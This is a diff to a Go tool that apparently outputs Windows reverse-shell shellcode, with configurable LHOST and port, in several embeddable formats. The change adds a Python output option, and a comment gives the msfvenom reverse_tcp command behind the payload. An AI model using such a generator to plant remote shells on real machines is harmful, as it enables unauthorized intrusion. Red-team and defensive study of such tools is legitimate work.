@@ -118,10 +118,20 @@ func formatPowerShell(buf []byte) string {
 	return sb.String()
 }
 
+func formatPython(buf []byte) string {
+	var sb strings.Builder
+	sb.WriteString("buf = \"")
+	for _, b := range buf {
+		sb.WriteString(fmt.Sprintf("\\x%02x", b))
+	}
+	sb.WriteString("\"")
+	return sb.String()
+}
+
 func main() {
 	flag.StringVar(&host, "l", "127.0.0.1", "LHOST IP address")
 	flag.IntVar(&port, "p", 4444, "Port number (0-65535)")
-	flag.StringVar(&format, "f", "raw", `Formats: {raw, hex, base64, c, rust, csharp, psh, vba}`)
+	flag.StringVar(&format, "f", "raw", `Formats: {raw, hex, base64, c, python, rust, csharp, psh, vba}`)
 	flag.Parse()
 
 	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f go
@@ -191,6 +201,8 @@ func main() {
 		fmt.Print(base64.StdEncoding.EncodeToString(buf))
 	case "c":
 		fmt.Print(formatC(buf))
+	case "python":
+		fmt.Print(formatPython(buf))
 	case "rust":
 		fmt.Print(formatRust(buf))
 	case "csharp":
